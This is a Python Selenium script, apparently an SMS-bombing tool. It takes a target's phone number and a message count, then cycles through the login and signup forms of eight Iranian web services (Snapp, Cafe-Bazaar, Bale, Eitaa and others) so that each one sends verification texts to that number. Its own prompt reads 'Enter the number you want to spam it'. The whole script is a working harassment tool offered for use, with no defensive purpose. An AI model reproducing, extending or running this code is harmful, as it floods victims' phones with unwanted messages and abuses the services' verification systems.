from selenium import webdriver
from time import sleep

# You must download the chromedriver. This file available in my repository.

# Functions
def click(section_xpatch):
    driver.find_element_by_xpath(section_xpatch).click()


def fill(section_xpatch, key):
    driver.find_element_by_xpath(section_xpatch).send_keys(str(key))


servers_data = {    
    0: {
      "server_name": "Snapp",
      "page_link": "https://app.snapp.taxi/login/?redirect_to=%2Fpre-ride%3Futm_source%3Dwebsite%26utm_medium%3Dwebapp-button",
      "input_patch": '//*[@id="login-input"]', 
      "done_patch": '//*[@id="next-button"]'
        },
    1: {
      "server_name": "Cafe-Bazaar",
      "page_link": 'https://cafebazaar.ir/login/',
      "input_patch": '//*[@id="id_username"]', 
      "done_patch": '//*[@id="login-form"]/div[3]/div/input'
        },    
    2: {
      "server_name": "Gap-messenger",
      "page_link": 'https://web.gap.im/#/',
      "input_patch": '//*[@id="lgp_PhoneNumber"]', 
      "done_patch": '//*[@id="sign-in-button"]'
        },    
    3: {
      "server_name": "Bale-messenger",
      "page_link": 'https://web.bale.ai/login',
      "input_patch": '//*[@id="شماره همراه"]', 
      "done_patch": '//*[@id="root"]/div[1]/div/div/button'
        },    
    4: {
      "server_name": "PayFa",
      "page_link": 'https://my.payfa.com/signup',
      "input_patch": '//*[@id="mobile"]', 
      "done_patch": '//*[@id="appVueMob"]/div/div[2]/div/button/span'
        },    
    5: {
      "server_name": "Eitaa",
      "page_link": 'https://web.eitaa.com/#/login',
      "input_patch": '//*[@id="ng-app"]/body/div[1]/div/div[2]/div[2]/form/div[2]/div[2]/input',
      "done_patch": '//*[@id="ng-app"]/body/div[1]/div/div[2]/div[1]/div/a'
        },    
    6: {
      "server_name": "Taaghche",
      "page_link": 'https://taaghche.com/',
      "click_patch": '//*[@id="__next"]/header/div[2]/div/div/div[2]/div/div/a', 
      "input_patch": '/html/body/div[2]/div/div/div/div[2]/form/input',
      "done_patch": '/html/body/div[2]/div/div/div/div[2]/form/button'
        },    
    7: {
      "server_name": "Sheypoor",
      "page_link": 'https://www.sheypoor.com/session',
      "input_patch": '//*[@id="username"]',
      "done_patch": '//*[@id="session"]/div/form/p[5]/button'
        }, 
}

while True:
    phone_number = input('Enter the number you want to spam it: ')
    try:
        if len(phone_number) != 11:
            print("-Please enter a phone number!")
        else:
            int(phone_number)
            break
    except:
        print("-Please enter a phone number!")

while True:
    target_number = int(input('Enter the number of messages: '))
    try:
        target_number = int(target_number)
        break
    except:
        print("-Please enter a number!")

done_number = 0
now_number = 0

driver = webdriver.Chrome(executable_path='/home/[user]/Desktop/Python/Spammer/chromedriver') # chromedriver patch
while True:
    if done_number >= target_number:
        break

    if now_number>len(servers_data)-1:
        now_number = 0
        driver.close()
        driver = webdriver.Chrome(executable_path='/home/iman/Desktop/Erfan/Python/Spammer/chromedriver')

    driver.get(servers_data[now_number]["page_link"])

    if now_number==6:
        click(servers_data[now_number]["click_patch"])
    
    while True:
        try:
            click(servers_data[now_number]["input_patch"])
            break
        except:
            pass 

    fill(servers_data[now_number]["input_patch"], phone_number)
    click(servers_data[now_number]["done_patch"])

    if now_number == 6:
        sleep(6)
        now_number += 1
        done_number += 1
        if done_number >= target_number:
            break
        else:
            while True:
                try:
                    click('/html/body/div[2]/div/div/div/div/button[2]')
                    break
                except:
                    pass

    if now_number == 5:
        sleep(2)
        click('//*[@id="ng-app"]/body/div[5]/div[2]/div/div/div[2]/button[2]')
    sleep(1)

    now_number += 1
    done_number += 1

driver.close()
print("+The mission was completed successfully.")
